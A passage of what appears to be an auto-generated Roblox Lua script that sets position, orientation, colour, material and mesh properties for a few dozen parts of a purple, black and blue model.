Part259.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part259.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part259.brickColor = BrickColor.new("Royal purple")
SpecialMesh260.Parent = Part259
SpecialMesh260.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh260.MeshType = Enum.MeshType.Wedge
Part261.Parent = Model0
Part261.CFrame = CFrame.new(-0.574076533, 3.38927007, -19.0215836, 0.00237613311, 0.999985635, -0.00480454601, -0.680895686, 0.00513664167, 0.732362568, 0.732376754, 0.00153120293, 0.68089813)
Part261.Orientation = Vector3.new(-47.079998, -0.399999976, -89.5699997)
Part261.Position = Vector3.new(-0.574076533, 3.38927007, -19.0215836)
Part261.Rotation = Vector3.new(-47.0900002, -0.280000001, -89.8600006)
Part261.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part261.Velocity = Vector3.new(3.48918228e-08, 0.00245641964, 4.58516467e-07)
Part261.Size = Vector3.new(0.940000057, 0.200000003, 0.285374999)
Part261.Anchored = true
Part261.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part261.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part261.BrickColor = BrickColor.new("Royal purple")
Part261.CanCollide = false
Part261.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part261.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part261.Material = Enum.Material.Neon
Part261.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part261.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part261.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part261.brickColor = BrickColor.new("Royal purple")
SpecialMesh262.Parent = Part261
SpecialMesh262.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh262.MeshType = Enum.MeshType.Wedge
Part263.Parent = Model0
Part263.CFrame = CFrame.new(-0.640052557, 2.92977762, -15.2103024, 0.00336818164, -0.999985635, -0.00416955911, -0.380026042, -0.00513675297, 0.924961627, -0.924969733, -0.00153089722, -0.380037904)
Part263.Orientation = Vector3.new(-67.659996, -179.369995, -90.7699966)
Part263.Position = Vector3.new(-0.640052557, 2.92977762, -15.2103024)
Part263.Rotation = Vector3.new(-112.339996, -0.239999995, 89.8099976)
Part263.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part263.Velocity = Vector3.new(1.07751589e-07, 0.00246435078, 1.41597127e-06)
Part263.Size = Vector3.new(0.288000047, 0.200000003, 0.27837503)
Part263.Anchored = true
Part263.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part263.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part263.BrickColor = BrickColor.new("Royal purple")
Part263.CanCollide = false
Part263.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part263.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part263.Material = Enum.Material.Neon
Part263.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part263.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part263.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part263.brickColor = BrickColor.new("Royal purple")
SpecialMesh264.Parent = Part263
SpecialMesh264.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh264.MeshType = Enum.MeshType.Wedge
Part265.Parent = Model0
Part265.CFrame = CFrame.new(-0.611472309, 3.03472614, -13.8177929, 0.999985635, -0.00162807154, 0.00510659395, 0.00513652945, 0.0189459547, -0.999807417, 0.00153100828, 0.999819279, 0.0189540461)
Part265.Orientation = Vector3.new(88.8799973, 15.0799999, 15.1700001)
Part265.Position = Vector3.new(-0.611472309, 3.03472614, -13.8177929)
Part265.Rotation = Vector3.new(88.909996, 0.289999992, 0.0899999961)
Part265.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part265.Velocity = Vector3.new(9.11103797e-08, 0.00246725697, 1.1972877e-06)
Part265.Size = Vector3.new(0.275000006, 0.200000003, 0.303375006)
Part265.Anchored = true
Part265.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part265.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part265.BrickColor = BrickColor.new("Really black")
Part265.CanCollide = false
Part265.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part265.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part265.Material = Enum.Material.Glass
Part265.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part265.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part265.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part265.brickColor = BrickColor.new("Really black")
SpecialMesh266.Parent = Part265
SpecialMesh266.Scale = Vector3.new(0.524999976, 0.5, 0.5)
SpecialMesh266.MeshType = Enum.MeshType.Wedge
Part267.Parent = Model0
Part267.CFrame = CFrame.new(-0.608101904, 3.29321218, -16.8867702, 0.999985635, -0.00103956275, 0.00525853597, 0.00513698952, -0.0943567529, -0.99552536, 0.00153108896, 0.995537996, -0.0943500549)
Part267.Orientation = Vector3.new(84.5800018, 176.809998, 176.87999)
Part267.Position = Vector3.new(-0.608101904, 3.29321218, -16.8867702)
Part267.Rotation = Vector3.new(95.409996, 0.299999982, 0.0599999987)
Part267.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part267.Velocity = Vector3.new(5.0123333e-08, 0.00246086251, 6.5867448e-07)
Part267.Size = Vector3.new(0.275000006, 0.454124868, 0.214375019)
Part267.Anchored = true
Part267.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part267.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part267.BrickColor = BrickColor.new("Bright blue")
Part267.CanCollide = false
Part267.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part267.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part267.Material = Enum.Material.Neon
Part267.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part267.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part267.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part267.brickColor = BrickColor.new("Bright blue")
SpecialMesh268.Parent = Part267
SpecialMesh268.Scale = Vector3.new(0.449999988, 0.899999976, 0.100000001)
SpecialMesh268.MeshType = Enum.MeshType.Brick
Part269.Parent = Model0
Part269.CFrame = CFrame.new(-0.609975338, 2.71316695, -13.7165575, -0.999985635, -0.00476232171, -0.00245974911, -0.00513671385, 0.720367908, 0.693573296, -0.0015310942, 0.693576038, -0.720381975)
Part269.Orientation = Vector3.new(-43.9099998, -179.800003, -0.409999996)
Part269.Position = Vector3.new(-0.609975338, 2.71316695, -13.7165575)
Part269.Rotation = Vector3.new(-136.089996, -0.140000001, 179.729996)
Part269.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part269.Velocity = Vector3.new(1.42098628e-07, 0.00246746815, 1.8673278e-06)
Part269.Size = Vector3.new(0.275000006, 0.403124899, 0.352375001)
Part269.Anchored = true
Part269.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part269.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part269.BrickColor = BrickColor.new("Really black")
Part269.CanCollide = false
Part269.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part269.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part269.Material = Enum.Material.Metal
Part269.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part269.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part269.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part269.brickColor = BrickColor.new("Really black")
SpecialMesh270.Parent = Part269
SpecialMesh270.Scale = Vector3.new(0.349999994, 1, 1)
SpecialMesh270.MeshType = Enum.MeshType.Brick
Part271.Parent = Model0
Part271.CFrame = CFrame.new(-0.583012402, 3.6639781, -14.1030874, 0.00476215919, 0.999985635, 0.00246015075, -0.720367849, 0.0051368745, -0.693573356, -0.693576038, 0.00153069268, 0.720381975)
Part271.Orientation = Vector3.new(43.9099998, 0.199999988, -89.5899963)
Part271.Position = Vector3.new(-0.583012402, 3.6639781, -14.1030874)
Part271.Rotation = Vector3.new(43.9099998, 0.140000001, -89.7299957)
Part271.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part271.Velocity = Vector3.new(-8.66738503e-09, 0.00246666698, -1.13898864e-07)
Part271.Size = Vector3.new(0.496000022, 0.200000003, 0.280375004)
Part271.Anchored = true
Part271.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part271.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part271.BrickColor = BrickColor.new("Royal purple")
Part271.CanCollide = false
Part271.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part271.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part271.Material = Enum.Material.Neon
Part271.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part271.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part271.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part271.brickColor = BrickColor.new("Royal purple")
SpecialMesh272.Parent = Part271
SpecialMesh272.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh272.MeshType = Enum.MeshType.Wedge
Part273.Parent = Model0
Part273.CFrame = CFrame.new(-0.573997319, 3.0173018, -17.825201, -0.00108546892, 0.999985635, -0.00524905883, -0.0856661052, 0.00513677904, 0.99631083, 0.996323526, 0.00153113017, 0.0856593028)
Part273.Orientation = Vector3.new(-85.0800018, -3.50999999, -86.5699997)
Part273.Position = Vector3.new(-0.573997319, 3.0173018, -17.825201)
Part273.Rotation = Vector3.new(-85.0899963, -0.299999982, -90.0599976)
Part273.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part273.Velocity = Vector3.new(9.38732327e-08, 0.00245891255, 1.23359519e-06)
Part273.Size = Vector3.new(1.78499997, 0.200000003, 0.301375002)
Part273.Anchored = true
Part273.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part273.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part273.BrickColor = BrickColor.new("Royal purple")
Part273.CanCollide = false
Part273.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part273.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part273.Material = Enum.Material.Neon
Part273.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part273.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part273.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part273.brickColor = BrickColor.new("Royal purple")
SpecialMesh274.Parent = Part273
SpecialMesh274.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh274.MeshType = Enum.MeshType.Wedge
Part275.Parent = Model0
Part275.CFrame = CFrame.new(-0.614639282, 3.4985106, -13.3051252, -0.999985635, 0.00162801275, 0.00510680024, -0.00513673527, -0.0189461038, -0.999807417, -0.00153094472, -0.999819279, 0.0189541951)
Part275.Orientation = Vector3.new(88.8799973, 15.0799999, -164.830002)
Part275.Position = Vector3.new(-0.614639282, 3.4985106, -13.3051252)
Part275.Rotation = Vector3.new(88.909996, 0.289999992, -179.909988)
Part275.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part275.Velocity = Vector3.new(1.75700912e-08, 0.00246832473, 2.30889498e-07)
Part275.Size = Vector3.new(0.275000006, 0.204125047, 0.207375005)
Part275.Anchored = true
Part275.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part275.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part275.BrickColor = BrickColor.new("Really black")
Part275.CanCollide = false
Part275.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part275.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part275.Material = Enum.Material.Metal
Part275.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part275.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part275.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part275.brickColor = BrickColor.new("Really black")
SpecialMesh276.Parent = Part275
SpecialMesh276.Scale = Vector3.new(0.5, 0.5, 0.5)
SpecialMesh276.MeshType = Enum.MeshType.Wedge
Part277.Parent = Model0
Part277.CFrame = CFrame.new(-0.609530032, 2.79620743, -14.2853489, 0.999985635, 0.00162795268, -0.00510686403, 0.0051367972, -0.0189460143, 0.999807417, 0.00153088395, -0.999819279, -0.0189541057)
Part277.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part277.Position = Vector3.new(-0.609530032, 2.79620743, -14.2853489)
Part277.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part277.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part277.Velocity = Vector3.new(1.28931248e-07, 0.00246628304, 1.6942945e-06)
Part277.Size = Vector3.new(0.275000006, 0.223999977, 0.375375003)
Part277.Anchored = true
Part277.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part277.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part277.BrickColor = BrickColor.new("Really black")
Part277.CanCollide = false
Part277.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part277.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part277.Material = Enum.Material.Glass
Part277.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part277.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part277.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part277.brickColor = BrickColor.new("Really black")
SpecialMesh278.Parent = Part277
SpecialMesh278.Scale = Vector3.new(0.5, 0.699999988, 0.5)
SpecialMesh278.MeshType = Enum.MeshType.Brick
Part279.Parent = Model0
Part279.CFrame = CFrame.new(-0.578278601, 2.9706955, -14.8714504, -0.00156111596, 0.999985635, -0.00512771122, 0.00585717056, 0.00513677299, 0.99996984, 0.999981761, 0.00153103413, -0.00586510636)
Part279.Orientation = Vector3.new(-89.5599976, -138.839996, 48.75)
Part279.Position = Vector3.new(-0.578278601, 2.9706955, -14.8714504)
Part279.Rotation = Vector3.new(-90.3399963, -0.289999992, -90.0899963)
Part279.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part279.Velocity = Vector3.new(1.01263424e-07, 0.00246506673, 1.33070978e-06)
Part279.Size = Vector3.new(0.49000001, 0.200000003, 0.290374994)
Part279.Anchored = true
Part279.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part279.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part279.BrickColor = BrickColor.new("Royal purple")
Part279.CanCollide = false
Part279.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part279.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part279.Material = Enum.Material.Neon
Part279.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part279.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part279.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part279.brickColor = BrickColor.new("Royal purple")
SpecialMesh280.Parent = Part279
SpecialMesh280.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh280.MeshType = Enum.MeshType.Wedge
Part281.Parent = Model0
Part281.CFrame = CFrame.new(-0.613238811, 3.32843637, -13.6493177, -0.999985635, -0.00162807142, -0.00510653527, -0.00513647031, 0.0189459249, 0.999807417, -0.00153100933, 0.999819279, -0.0189540163)
Part281.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part281.Position = Vector3.new(-0.613238811, 3.32843637, -13.6493177)
Part281.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part281.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part281.Velocity = Vector3.new(4.45380195e-08, 0.00246760761, 5.85277007e-07)
Part281.Size = Vector3.new(0.275000006, 0.698124886, 0.732374966)
Part281.Anchored = true
Part281.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part281.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part281.BrickColor = BrickColor.new("Really black")
Part281.CanCollide = false
Part281.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part281.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part281.Material = Enum.Material.Metal
Part281.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part281.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part281.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part281.brickColor = BrickColor.new("Really black")
SpecialMesh282.Parent = Part281
SpecialMesh282.Scale = Vector3.new(0.425000012, 1, 1)
SpecialMesh282.MeshType = Enum.MeshType.Cylinder
Part283.Parent = Model0
Part283.CFrame = CFrame.new(-0.614591718, 3.4972918, -13.3320847, -0.999985635, 0.00245974353, -0.0047620195, -0.00513649127, -0.693573475, 0.72036773, -0.00153088977, 0.720381856, 0.693576157)
Part283.Orientation = Vector3.new(-46.079998, -0.389999986, -179.580002)
Part283.Position = Vector3.new(-0.614591718, 3.4972918, -13.3320847)
Part283.Rotation = Vector3.new(-46.0900002, -0.269999981, -179.860001)
Part283.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part283.Velocity = Vector3.new(1.77633499e-08, 0.00246826862, 2.33429148e-07)
Part283.Size = Vector3.new(0.275000006, 0.413124949, 0.622375011)
Part283.Anchored = true
Part283.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part283.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part283.BrickColor = BrickColor.new("Really black")
Part283.CanCollide = false
Part283.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part283.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part283.Material = Enum.Material.Metal
Part283.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part283.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part283.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part283.brickColor = BrickColor.new("Really black")
SpecialMesh284.Parent = Part283
SpecialMesh284.Scale = Vector3.new(0.400000006, 1.04999995, 0.5)
SpecialMesh284.MeshType = Enum.MeshType.Brick
Part285.Parent = Model0
Part285.CFrame = CFrame.new(-0.615438342, 3.25487208, -11.9645395, -0.999985635, 0.00162786292, 0.00510683237, -0.00513676414, -0.0189459566, -0.999807417, -0.00153079513, -0.999819279, 0.0189540461)
Part285.Orientation = Vector3.new(88.8799973, 15.0799999, -164.830002)
Part285.Position = Vector3.new(-0.615438342, 3.25487208, -11.9645395)
Part285.Rotation = Vector3.new(88.909996, 0.289999992, -179.909988)
Part285.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part285.Velocity = Vector3.new(5.62028113e-08, 0.002471118, 7.38564609e-07)
Part285.Size = Vector3.new(0.275000006, 0.206125051, 0.280375004)
Part285.Anchored = true
Part285.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part285.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part285.BrickColor = BrickColor.new("Really black")
Part285.CanCollide = false
Part285.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part285.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part285.Material = Enum.Material.Metal
Part285.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part285.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part285.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part285.brickColor = BrickColor.new("Really black")
SpecialMesh286.Parent = Part285
SpecialMesh286.Scale = Vector3.new(0.400000006, 0.560000002, 0.5)
SpecialMesh286.MeshType = Enum.MeshType.Wedge
Part287.Parent = Model0
Part287.CFrame = CFrame.new(-0.613306701, 3.18584442, -13.1265478, -0.999985635, -0.00162807154, -0.00510656228, -0.00513649778, 0.0189459547, 0.999807417, -0.00153100886, 0.999819279, -0.0189540461)
Part287.Orientation = Vector3.new(-88.8799973, -164.919998, -15.1700001)
Part287.Position = Vector3.new(-0.613306701, 3.18584442, -13.1265478)
Part287.Rotation = Vector3.new(-91.0899963, -0.289999992, 179.909988)
Part287.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part287.Velocity = Vector3.new(6.71482141e-08, 0.00246869703, 8.82399092e-07)
Part287.Size = Vector3.new(0.275000006, 0.567124963, 0.311374992)
Part287.Anchored = true
Part287.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part287.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part287.BrickColor = BrickColor.new("Really black")
Part287.CanCollide = false
Part287.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part287.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part287.Material = Enum.Material.Metal
Part287.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part287.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part287.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part287.brickColor = BrickColor.new("Really black")
SpecialMesh288.Parent = Part287
SpecialMesh288.Scale = Vector3.new(0.400000006, 1.04999995, 0.5)
SpecialMesh288.MeshType = Enum.MeshType.Brick
Part289.Parent = Model0
Part289.CFrame = CFrame.new(-0.646988273, 3.68078995, -13.1990242, 0.00245985761, -0.999985635, 0.00476197852, -0.693573356, -0.00513654156, -0.720367849, 0.720381916, -0.00153077836, -0.693576097)
Part289.Orientation = Vector3.new(46.079998, 179.610001, -90.4199982)
Part289.Position = Vector3.new(-0.646988273, 3.68078995, -13.1990242)
Part289.Rotation = Vector3.new(133.910004, 0.269999981, 89.8600006)
Part289.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part289.Velocity = Vector3.new(-1.13331566e-08, 0.00246854057, -1.48930098e-07)
Part289.Size = Vector3.new(0.496000022, 0.200000003, 0.280375004)
Part289.Anchored = true
Part289.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part289.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part289.BrickColor = BrickColor.new("Royal purple")
Part289.CanCollide = false
Part289.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part289.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part289.Material = Enum.Material.Neon
Part289.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part289.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part289.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part289.brickColor = BrickColor.new("Royal purple")
SpecialMesh290.Parent = Part289
SpecialMesh290.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh290.MeshType = Enum.MeshType.Wedge
Part291.Parent = Model0
Part291.CFrame = CFrame.new(-0.611590862, 3.29178786, -14.6020966, 0.999985635, -0.00510681886, -0.00162807701, 0.00513675623, 0.999807417, 0.0189470276, 0.00153100397, -0.018955119, 0.999819279)
Part291.Orientation = Vector3.new(-1.09000003, -0.0899999961, 0.289999992)
Part291.Position = Vector3.new(-0.611590862, 3.29178786, -14.6020966)
Part291.Rotation = Vector3.new(-1.09000003, -0.0899999961, 0.289999992)
Part291.Color = Color3.new(0.972549, 0.972549, 0.972549)
Part291.Velocity = Vector3.new(5.03492039e-08, 0.00246562273, 6.61642332e-07)
Part291.Size = Vector3.new(0.275000006, 0.200124964, 0.287375033)
Part291.Anchored = true
Part291.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part291.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part291.BrickColor = BrickColor.new("Institutional white")
Part291.CanCollide = false
Part291.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part291.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part291.Material = Enum.Material.Metal
Part291.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part291.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part291.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part291.brickColor = BrickColor.new("Institutional white")
SpecialMesh292.Parent = Part291
SpecialMesh292.Scale = Vector3.new(0.560000002, 1, 0.899999976)
SpecialMesh292.MeshType = Enum.MeshType.Wedge
Part293.Parent = Model0
Part293.CFrame = CFrame.new(-0.636496425, 3.01698065, -17.8252964, 0.00108537939, -0.999985635, -0.00524905883, 0.0856661052, -0.00513678649, 0.99631083, -0.996323466, -0.00153104111, 0.0856593102)
Part293.Orientation = Vector3.new(-85.0800018, -3.50999999, 93.4300003)
Part293.Position = Vector3.new(-0.636496425, 3.01698065, -17.8252964)
Part293.Rotation = Vector3.new(-85.0899963, -0.299999982, 89.9399948)
Part293.Color = Color3.new(0.384314, 0.145098, 0.819608)
Part293.Velocity = Vector3.new(9.39241573e-08, 0.00245890254, 1.23426435e-06)
Part293.Size = Vector3.new(1.78499997, 0.200000003, 0.301375002)
Part293.Anchored = true
Part293.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part293.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part293.BrickColor = BrickColor.new("Royal purple")
Part293.CanCollide = false
Part293.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part293.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part293.Material = Enum.Material.Neon
Part293.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part293.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part293.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part293.brickColor = BrickColor.new("Royal purple")
SpecialMesh294.Parent = Part293
SpecialMesh294.Scale = Vector3.new(1, 0.300000012, 0.5)
SpecialMesh294.MeshType = Enum.MeshType.Wedge
Part295.Parent = Model0
Part295.CFrame = CFrame.new(-0.611132324, 3.1960454, -14.5803022, 0.999985635, 0.00162786234, -0.00510698371, 0.00513691502, -0.0189458374, 0.999807417, 0.00153079221, -0.999819279, -0.0189539269)
Part295.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part295.Position = Vector3.new(-0.611132324, 3.1960454, -14.5803022)
Part295.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part295.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part295.Velocity = Vector3.new(6.55306707e-08, 0.00246566813, 8.61143121e-07)
Part295.Size = Vector3.new(0.275000006, 0.277124941, 0.702375054)
Part295.Anchored = true
Part295.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part295.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part295.BrickColor = BrickColor.new("Really black")
Part295.CanCollide = false
Part295.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part295.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part295.Material = Enum.Material.Glass
Part295.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part295.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part295.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part295.brickColor = BrickColor.new("Really black")
SpecialMesh296.Parent = Part295
SpecialMesh296.Scale = Vector3.new(0.550000012, 0.5, 0.800000012)
SpecialMesh296.MeshType = Enum.MeshType.Brick
Part297.Parent = Model0
Part297.CFrame = CFrame.new(-0.610346913, 2.907269, -14.1244287, 0.999985635, 0.00162795268, -0.00510686403, 0.0051367972, -0.0189460143, 0.999807417, 0.00153088395, -0.999819279, -0.0189541057)
Part297.Orientation = Vector3.new(-88.8799973, -164.919998, 164.830002)
Part297.Position = Vector3.new(-0.610346913, 2.907269, -14.1244287)
Part297.Rotation = Vector3.new(-91.0899963, -0.289999992, -0.0899999961)
Part297.Color = Color3.new(0.0509804, 0.411765, 0.67451)
Part297.Velocity = Vector3.new(1.11320702e-07, 0.00246661808, 1.462873e-06)
Part297.Size = Vector3.new(0.275000006, 0.207000002, 0.213375002)
Part297.Anchored = true
Part297.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part297.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part297.BrickColor = BrickColor.new("Bright blue")
Part297.CanCollide = false
Part297.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part297.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
Part297.Material = Enum.Material.Neon
Part297.RightSurface = Enum.SurfaceType.SmoothNoOutlines
Part297.RotVelocity = Vector3.new(-2.08372262e-06, 1.18487212e-14, 1.58565669e-07)
Part297.TopSurface = Enum.SurfaceType.SmoothNoOutlines
Part297.brickColor = BrickColor.new("Bright blue")
SpecialMesh298.Parent = Part297
SpecialMesh298.Scale = Vector3.new(0.550000012, 0.25, 0.5)
SpecialMesh298.MeshType = Enum.MeshType.Wedge
Part299.Parent = Model0
Part299.CFrame = CFrame.new(-0.617512941, 3.42300797, -11.1735916, 0.999985635, -0.00206693518, 0.00494515104, 0.00513641397, 0.106012821, -0.994351625, 0.00153101049, 0.994362772, 0.106021926)
Part299.Orientation = Vector3.new(83.909996, 2.66999984, 2.76999998)
Part299.Position = Vector3.new(-0.617512941, 3.42300797, -11.1735916)
Part299.Rotation = Vector3.new(83.909996, 0.280000001, 0.119999997)
Part299.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
Part299.Velocity = Vector3.new(2.95422424e-08, 0.00247276574, 3.88216051e-07)
Part299.Size = Vector3.new(0.275000006, 0.223124996, 0.234375)
Part299.Anchored = true
Part299.BackSurface = Enum.SurfaceType.SmoothNoOutlines
Part299.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
Part299.BrickColor = BrickColor.new("Really black")
Part299.CanCollide = false
Part299.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
Part299.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
